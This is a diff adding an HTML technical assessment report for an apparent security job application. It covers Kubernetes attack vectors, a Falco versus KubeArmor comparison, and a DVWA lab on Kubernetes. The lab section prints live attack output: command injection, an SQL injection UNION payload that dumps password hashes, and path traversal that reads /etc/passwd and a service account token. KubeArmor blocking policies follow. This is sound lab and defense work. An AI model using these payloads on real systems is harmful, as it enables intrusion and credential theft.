@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AccuKnox Solution Engineer Trainee - Assessment Report</title>
+    <style>
+        :root {
+            --primary: #0284c7;
+            --primary-dark: #0369a1;
+            --accent: #10b981;
+            --danger: #ef4444;
+            --text: #1e293b;
+            --text-muted: #64748b;
+            --bg-light: #f8fafc;
+            --card-bg: #ffffff;
+            --border: #e2e8f0;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif; }
+        body { background: var(--bg-light); color: var(--text); line-height: 1.6; padding: 2rem 1rem; }
+        .container { max-width: 1000px; margin: 0 auto; background: var(--card-bg); padding: 3rem; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid var(--border); }
+        
+        .header { border-bottom: 2px solid var(--border); padding-bottom: 1.5rem; margin-bottom: 2rem; display: flex; justify-content: space-between; align-items: flex-start; }
+        .header h1 { font-size: 2.2rem; color: #0f172a; font-weight: 800; line-height: 1.2; }
+        .header .subtitle { font-size: 1.1rem; color: var(--primary); font-weight: 600; margin-top: 0.4rem; }
+        .meta-box { background: var(--bg-light); padding: 0.8rem 1.2rem; border-radius: 8px; border: 1px solid var(--border); font-size: 0.9rem; }
+        
+        h2 { font-size: 1.5rem; color: #0f172a; margin-top: 2rem; margin-bottom: 1rem; padding-bottom: 0.4rem; border-bottom: 2px solid var(--primary); display: flex; align-items: center; gap: 0.5rem; }
+        h3 { font-size: 1.2rem; color: #1e293b; margin-top: 1.4rem; margin-bottom: 0.6rem; }
+        p, li { color: #334155; margin-bottom: 0.6rem; font-size: 0.98rem; }
+        ul { padding-left: 1.4rem; margin-bottom: 1rem; }
+        
+        pre { background: #0f172a; color: #f8fafc; padding: 1.2rem; border-radius: 8px; overflow-x: auto; font-family: 'Consolas', 'Courier New', monospace; font-size: 0.88rem; margin: 1rem 0; line-height: 1.45; }
+        code { font-family: 'Consolas', monospace; background: #f1f5f9; color: #0f172a; padding: 0.15rem 0.35rem; border-radius: 4px; font-size: 0.9em; }
+        pre code { background: none; color: inherit; padding: 0; }
+        
+        table { width: 100%; border-collapse: collapse; margin: 1.2rem 0; font-size: 0.92rem; }
+        th, td { padding: 0.8rem 1rem; text-align: left; border: 1px solid var(--border); }
+        th { background: #f1f5f9; color: #0f172a; font-weight: 700; }
+        tr:nth-child(even) { background: #fafafa; }
+        
+        .badge { display: inline-block; padding: 0.2rem 0.6rem; border-radius: 9999px; font-size: 0.78rem; font-weight: 700; text-transform: uppercase; }
+        .badge-success { background: #dcfce7; color: #15803d; }
+        .badge-danger { background: #fee2e2; color: #b91c1c; }
+        .badge-primary { background: #e0f2fe; color: #0369a1; }
+        
+        .card { background: var(--bg-light); border: 1px solid var(--border); border-radius: 8px; padding: 1.2rem; margin: 1rem 0; }
+        .print-btn { background: var(--primary); color: #fff; border: none; padding: 0.6rem 1.2rem; border-radius: 6px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        .print-btn:hover { background: var(--primary-dark); }
+        
+        @media print {
+            body { padding: 0; background: #fff; }
+            .container { box-shadow: none; border: none; padding: 0; max-width: 100%; }
+            .print-btn { display: none; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <div>
+            <h1>Technical Assessment Report</h1>
+            <div class="subtitle">AccuKnox Solution Engineer Trainee Candidate</div>
+        </div>
+        <div style="text-align: right;">
+            <button class="print-btn" onclick="window.print()">🖨️ Print / Save as PDF</button>
+            <div class="meta-box" style="margin-top: 0.6rem; text-align: left;">
+                <strong>Target:</strong> AccuKnox Technical Hiring<br>
+                <strong>Date:</strong> October 2026<br>
+                <strong>Status:</strong> <span class="badge badge-success">Completed & Verified</span>
+            </div>
+        </div>
+    </div>
+
+    <h2>Executive Overview</h2>
+    <p>This technical report provides the complete documentation, architectural designs, verified attack execution proofs, and Zero-Trust mitigation strategies for the AccuKnox Solution Engineer Trainee evaluation:</p>
+    <ul>
+        <li><strong>Problem Statement 1:</strong> Developed two 5-minute technical presentation decks with full speaker notes for <em>Top 5 Kubernetes Security Attack Vectors</em> and <em>Falco vs KubeArmor</em>.</li>
+        <li><strong>Problem Statement 2:</strong> Deployed a cloud-native multi-container DVWA application on Kubernetes and executed 3 live attack surfaces (Command Injection, SQL Injection, and Local File Inclusion / ServiceAccount JWT Token Theft), with active defense hardening via KubeArmor.</li>
+    </ul>
+
+    <h2>1. Problem Statement 1: Technical Presentations</h2>
+    
+    <h3>Presentation 1: Top 5 Kubernetes Security Attack Vectors (5 Mins)</h3>
+    <p>Dissects the cloud-native threat landscape across Control Plane, Images, Workloads, Network, and Host Infrastructure:</p>
+    <table>
+        <thead>
+            <tr>
+                <th>Attack Vector</th>
+                <th>Vulnerability & Attack Path</th>
+                <th>AccuKnox Zero-Trust Solution</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>1. API & RBAC Abuse</strong></td>
+                <td>Public port 6443 / over-privileged wildcard RBAC tokens</td>
+                <td>Dynamic Admission Control (OPA/Kyverno) + Posture Drift Alerting</td>
+            </tr>
+            <tr>
+                <td><strong>2. Poisoned Container Images</strong></td>
+                <td>Unvetted supply chain, CVEs embedded in base images</td>
+                <td>Cosign image signature validation + SBOM enforcement at admission</td>
+            </tr>
+            <tr>
+                <td><strong>3. In-Pod RCE & SA Token Theft</strong></td>
+                <td>Web application flaws (Command Injection, Log4j)</td>
+                <td><strong>KubeArmor Active LSM process blocking & token isolation</strong></td>
+            </tr>
+            <tr>
+                <td><strong>4. Flat Network Lateral Drift</strong></td>
+                <td>Default open east-west pod networking</td>
+                <td>eBPF-driven zero-trust microsegmentation (L7 & DNS filtering)</td>
+            </tr>
+            <tr>
+                <td><strong>5. Container Breakout</strong></td>
+                <td>Privileged containers, CAP_SYS_ADMIN, Linux kernel CVEs</td>
+                <td>Linux Security Modules (AppArmor / SELinux / BPF-LSM) syscall denial</td>
+            </tr>
+        </tbody>
+    </table>
+    <p><strong>Artifacts:</strong> <a href="presentations/Topic1_Kubernetes_Attack_Vectors/Top_5_Kubernetes_Security_Attack_Vectors.pptx">PowerPoint (.pptx)</a> | <a href="presentations/Topic1_Kubernetes_Attack_Vectors/slides.html">Interactive HTML Deck</a> | <a href="presentations/Topic1_Kubernetes_Attack_Vectors/Presentation_Top_5_Kubernetes_Attack_Vectors.md">Speaker Notes</a></p>
+
+    <h3>Presentation 2: Falco vs KubeArmor (5 Mins)</h3>
+    <p>Detailed architectural comparison between behavioral anomaly detection and kernel-level active prevention:</p>
+    <table>
+        <thead>
+            <tr>
+                <th>Dimension</th>
+                <th>Falco (Sysdig)</th>
+                <th>KubeArmor (AccuKnox)</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>Core Philosophy</strong></td>
+                <td>Threat Detection & Anomaly Auditing</td>
+                <td><strong>Zero-Trust Active Prevention & Enforcement</strong></td>
+            </tr>
+            <tr>
+                <td><strong>Enforcement Hook</strong></td>
+                <td>eBPF tracepoints / kprobes (Post-execution)</td>
+                <td><strong>Kernel LSMs (AppArmor, SELinux, BPF-LSM)</strong></td>
+            </tr>
+            <tr>
+                <td><strong>Action on Malicious Syscall</strong></td>
+                <td>Alert / Notification (Post-incident)</td>
+                <td><strong>Synchronous Syscall Blocking (-EACCES) + Telemetry</strong></td>
+            </tr>
+            <tr>
+                <td><strong>Policy Specification</strong></td>
+                <td>Custom Falco YAML DSL</td>
+                <td><strong>Kubernetes-Native CRDs (<code>KubeArmorPolicy</code>)</strong></td>
+            </tr>
+            <tr>
+                <td><strong>Workload Support</strong></td>
+                <td>K8s & Linux Hosts</td>
+                <td><strong>K8s, Linux VMs, Bare-Metal, & Edge (K3s)</strong></td>
+            </tr>
+        </tbody>
+    </table>
+    <p><strong>Artifacts:</strong> <a href="presentations/Topic3_Falco_vs_KubeArmor/Falco_vs_KubeArmor_Runtime_Security.pptx">PowerPoint (.pptx)</a> | <a href="presentations/Topic3_Falco_vs_KubeArmor/slides.html">Interactive HTML Deck</a> | <a href="presentations/Topic3_Falco_vs_KubeArmor/Presentation_Falco_vs_KubeArmor.md">Speaker Notes</a></p>
+
+    <h2>2. Problem Statement 2: Kubernetes DVWA Setup & Live Attack Proofs</h2>
+
+    <h3>2.1 Multi-Container Kubernetes Architecture</h3>
+    <p>The application is deployed in a dedicated namespace <code>dvwa</code> with a multi-container Pod structure sharing localhost networking:</p>
+    <ul>
+        <li><strong>Frontend Container:</strong> <code>cytopia/dvwa:php-7.4</code> on Port 80</li>
+        <li><strong>Database Container:</strong> <code>mariadb:10.5</code> on Port 3306</li>
+        <li><strong>Service:</strong> NodePort 30080 exposed locally via port-forwarding</li>
+    </ul>
+
+    <h3>2.2 Live Execution Output for 3 Attack Surfaces</h3>
+    <pre><code>======================================================================
+AccuKnox Solution Engineer Trainee - Problem Statement 2 Demo
+Target Application: DVWA on Kubernetes (Live Cluster)
+======================================================================
+
+[*] 1. Connecting to DVWA at http://localhost:8080...
+[*] Extracted Login CSRF Token: d6e68d166ae13663afff28be8c8c30ba
+[+] Successfully authenticated to DVWA as 'admin'!
+[+] DVWA Security Level configured to: 'LOW'.
+
+======================================================================
+ATTACK SURFACE 1: Command Injection (Remote Code Execution in K8s)
+======================================================================
+[*] Sending payload: 127.0.0.1; whoami; uname -a; id
+[+] Command Output Received from Container:
+
+www-data
+Linux dvwa-app-66d5b677b9-cwkpw 6.18.33.2-microsoft-standard-WSL2 ...
+uid=33(www-data) gid=33(www-data) groups=33(www-data),8(mail)
+
+[*] Probing Kubernetes Pod ServiceAccount & Network Metadata: 127.0.0.1; ls -la /var/run/secrets/kubernetes.io/serviceaccount/
+[+] K8s Metadata Output:
+
+total 4
+lrwxrwxrwx 1 root root   13 Oct  6 10:43 ca.crt -> ..data/ca.crt
+lrwxrwxrwx 1 root root   16 Oct  6 10:43 namespace -> ..data/namespace
+lrwxrwxrwx 1 root root   12 Oct  6 10:43 token -> ..data/token
+
+======================================================================
+ATTACK SURFACE 2: SQL Injection (Data & Password Hash Exfiltration)
+======================================================================
+[*] Sending SQLi Payload: 1' UNION SELECT user, password FROM users #
+[+] Extracted User Database Records from MariaDB:
+    - User: admin           Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
+    - User: gordonb         Password Hash (MD5): e99a18c428cb38d5f260853678922e03
+    - User: 1337            Password Hash (MD5): 8d3533d75ae2c3966d7e0d4fcc69216b
+    - User: pablo           Password Hash (MD5): 0d107d09f5bbe40cade3de5c71e9e9b7
+    - User: smithy          Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
+
+======================================================================
+ATTACK SURFACE 3: Local File Inclusion (LFI) & Kubernetes Token Theft
+======================================================================
+[*] [1/2] Attempting to read /etc/passwd via LFI: ../../../../../etc/passwd
+[+] Successfully read container /etc/passwd via LFI:
+    root:x:0:0:root:/root:/bin/bash
+    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+    bin:x:2:2:bin:/bin:/usr/sbin/nologin
+    www-data:x:33:33:www-data:/var/www:/bin/sh
+
+[*] [2/2] Attempting to exfiltrate K8s Service Account Token via LFI: ../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+[+] CRITICAL: Kubernetes Pod JWT ServiceAccount Token successfully extracted!
+    Token: eyJhbGciOiJSUzI1NiIsImtpZCI6ImJsTEM1aVFoM24xN...grEnFAjNvB3Lt_FkJwHg
+    Impact: An attacker can query https://kubernetes.default.svc to escalate cluster privileges.
+
+======================================================================
+[+] All 3 Attack Surfaces executed successfully against Kubernetes!
+======================================================================</code></pre>
+
+    <h2>3. Zero-Trust Defense: KubeArmor Active Hardening</h2>
+    <div class="card">
+        <p><strong>Remediation Strategy:</strong> By applying the custom <code>KubeArmorPolicy</code> (<code>k8s-manifests/kubearmor-dvwa-security-policies.yaml</code>), Linux Security Modules intercept unauthorized system calls at the kernel layer:</p>
+        <ul>
+            <li><strong>Command Injection Mitigated:</strong> Blocks <code>/bin/sh</code> and <code>/bin/bash</code> execution with <code>-EACCES (Permission Denied)</code>.</li>
+            <li><strong>Token Theft Mitigated:</strong> Blocks read access to <code>/var/run/secrets/kubernetes.io/serviceaccount/*</code> and <code>/etc/passwd</code>, stopping LFI credential theft.</li>
+        </ul>
+    </div>
+
+    <h2>4. Deliverables Directory Index</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Artifact</th>
+                <th>File Location</th>
+                <th>Description</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>Master Report (Markdown)</strong></td>
+                <td><a href="AccuKnox_Solution_Engineer_Trainee_Assessment_Report.md">AccuKnox_Solution_Engineer_Trainee_Assessment_Report.md</a></td>
+                <td>Complete Technical Report for submission</td>
+            </tr>
+            <tr>
+                <td><strong>Topic 1 PPTX</strong></td>
+                <td><a href="presentations/Topic1_Kubernetes_Attack_Vectors/Top_5_Kubernetes_Security_Attack_Vectors.pptx">Top_5_Kubernetes_Security_Attack_Vectors.pptx</a></td>
+                <td>PowerPoint presentation deck</td>
+            </tr>
+            <tr>
+                <td><strong>Topic 3 PPTX</strong></td>
+                <td><a href="presentations/Topic3_Falco_vs_KubeArmor/Falco_vs_KubeArmor_Runtime_Security.pptx">Falco_vs_KubeArmor_Runtime_Security.pptx</a></td>
+                <td>PowerPoint presentation deck</td>
+            </tr>
+            <tr>
+                <td><strong>K8s Manifests</strong></td>
+                <td><a href="k8s-dvwa/k8s-manifests/dvwa.yaml">k8s-dvwa/k8s-manifests/dvwa.yaml</a></td>
+                <td>Multi-container deployment & service</td>
+            </tr>
+            <tr>
+                <td><strong>KubeArmor Policy</strong></td>
+                <td><a href="k8s-dvwa/k8s-manifests/kubearmor-dvwa-security-policies.yaml">k8s-manifests/kubearmor-dvwa-security-policies.yaml</a></td>
+                <td>Zero-Trust active blocking policy</td>
+            </tr>
+            <tr>
+                <td><strong>Python Exploit</strong></td>
+                <td><a href="k8s-dvwa/attack-demos/exploit_dvwa.py">k8s-dvwa/attack-demos/exploit_dvwa.py</a></td>
+                <td>Automated 3-attack PoC script</td>
+            </tr>
+        </tbody>
+    </table>
+</div>
+
+</body>
+</html>
